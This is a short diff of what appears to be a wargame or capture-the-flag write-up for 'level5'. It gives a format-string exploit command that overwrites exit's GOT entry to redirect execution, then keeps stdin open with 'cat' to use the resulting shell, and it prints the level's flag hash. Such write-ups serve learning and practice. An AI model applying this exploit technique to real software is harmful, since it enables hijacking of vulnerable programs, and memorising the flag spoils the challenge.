@@ -28,7 +28,7 @@ o = `0x080484a4` -> `134513828`
 exit = `*0x8049838`
 
 ```bash
-python -c 'print "\x38\x98\x04\x08" + "%134513824x%4$n"' | ./level5
+(python -c 'print "\x38\x98\x04\x08" + "%134513824x%4$n"' ; cat) | ./level5
                                         ^^^^^^^^^ o - 4
 ```
 `d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31`
